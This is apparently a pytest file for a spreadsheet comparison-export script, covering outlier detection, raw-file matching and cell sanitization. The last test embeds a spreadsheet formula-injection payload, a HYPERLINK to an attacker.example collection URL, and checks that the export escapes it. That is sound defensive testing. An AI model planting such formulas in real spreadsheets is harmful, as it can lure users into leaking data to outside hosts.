import pandas as pd
import numpy as np
from openpyxl import Workbook
from unittest.mock import patch

from scripts.export_comparison_sheets import (
    _process_single_file,
    detect_outliers_series,
    find_matching_raw_file,
)


def test_detect_outliers_series_basic():
    """Test detecting an obvious outlier."""
    values = pd.Series([1.0, 1.1, 0.9, 1.0, 100.0, 1.2, 0.8, 1.0, 1.1, 0.9])
    outliers = detect_outliers_series(values, window_size=5, threshold=3.0)
    assert outliers == [4]


def test_detect_outliers_series_short():
    """Test with a series shorter than window_size."""
    values = pd.Series([1.0, 100.0, 1.0])
    outliers = detect_outliers_series(values, window_size=5, threshold=3.0)
    assert outliers == []


def test_detect_outliers_series_flat():
    """Test with a flat series (zero MAD)."""
    values = pd.Series([1.0, 1.0, 1.0, 1.0, 1.0, 100.0, 1.0, 1.0, 1.0, 1.0])
    outliers = detect_outliers_series(values, window_size=5, threshold=3.0)
    assert outliers == [5]


def test_detect_outliers_series_with_nans():
    """Test handling of NaNs."""
    values = pd.Series([1.0, 1.1, np.nan, 1.0, 100.0, 1.2, np.nan, 1.0, 1.1, 0.9])
    outliers = detect_outliers_series(values, window_size=3, threshold=3.0)
    assert outliers == [4]


@patch("scripts.export_comparison_sheets.os.path.isfile")
def test_find_matching_raw_file_series_format(mock_isfile):
    """Test matching 'Series26_File01_Processed.xlsx' format."""
    mock_isfile.return_value = True
    result = find_matching_raw_file("Series26_File01_Processed.xlsx")
    assert result is not None
    assert "S26_Y01.txt" in result


@patch("scripts.export_comparison_sheets.os.listdir")
def test_find_matching_raw_file_year_format(mock_listdir):
    """Test matching 'Year_1995 (Y01)_Data.xlsx' format."""
    mock_listdir.return_value = ["S26_Y01.txt", "S26_Y02.txt"]
    result = find_matching_raw_file("Year_1995 (Y01)_Data.xlsx")
    assert result is not None
    assert "S26_Y01.txt" in result


def test_find_matching_raw_file_no_match():
    """Test when filename matches no known pattern."""
    result = find_matching_raw_file("Unknown_Format.xlsx")
    assert result is None


def test_process_single_file_escapes_malicious_comment(tmp_path, monkeypatch):
    """Comparison export must sanitize attacker-controlled cells from the processed file."""
    raw_dir = tmp_path / "raw"
    output_dir = tmp_path / "output"
    comparison_dir = output_dir / "comparisons"
    raw_dir.mkdir()
    output_dir.mkdir()
    comparison_dir.mkdir()

    raw_file = raw_dir / "S26_Y01.txt"
    raw_file.write_text("1 10\n2 20\n3 30\n", encoding="utf-8")

    proc_file = output_dir / "Year_1995 (Y01)_Data.xlsx"
    payload = '=HYPERLINK("http://attacker.example/collect","click")'

    wb = Workbook()
    ws = wb.active
    ws["A1"] = "Time (Seconds)"
    ws["B1"] = "Processed_Value"
    ws["C1"] = "Comment"
    for row, (t, v) in enumerate([(1, 10), (2, 20), (3, 30)], start=2):
        ws.cell(row=row, column=1, value=t)
        ws.cell(row=row, column=2, value=v)
        c = ws.cell(row=row, column=3, value=payload)
        c.data_type = "s"
    wb.save(proc_file)

    monkeypatch.setattr("scripts.export_comparison_sheets.RAW_DATA_DIR", str(raw_dir))
    monkeypatch.setattr("scripts.export_comparison_sheets.OUTPUT_DIR", str(output_dir))
    monkeypatch.setattr(
        "scripts.export_comparison_sheets.COMPARISON_DIR", str(comparison_dir)
    )

    _process_single_file(str(proc_file))

    out_file = comparison_dir / "Year_1995 (Y01)_Data_comparison.xlsx"
    assert out_file.exists()

    result_wb = pd.read_excel(out_file, engine="openpyxl")
    assert result_wb["Comment"].iloc[0] == "'" + payload
